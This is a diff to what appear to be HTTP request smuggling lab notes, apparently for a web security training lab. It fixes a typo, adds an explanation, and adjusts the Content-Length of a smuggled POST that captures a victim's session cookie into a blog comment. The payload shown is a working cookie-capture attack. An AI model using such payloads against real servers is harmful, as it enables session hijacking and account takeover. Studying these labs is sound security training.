@@ -122,7 +122,7 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 
 ### Content-Length Capture victim requests
 
->Sending a POST request with smuggled request but the content length is longer thant the real length and when victim browse their cookie session value is posted to blob comment.  
+>Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to 850, then smuggle it to the back-end server.
 
 ```html
 POST / HTTP/1.1
@@ -135,7 +135,7 @@ Transfer-Encoding: chunked
 
 POST /post/comment HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 860
+Content-Length: 850
 Cookie: session=your-session-token
 
 csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40mail.net&website=&comment=test
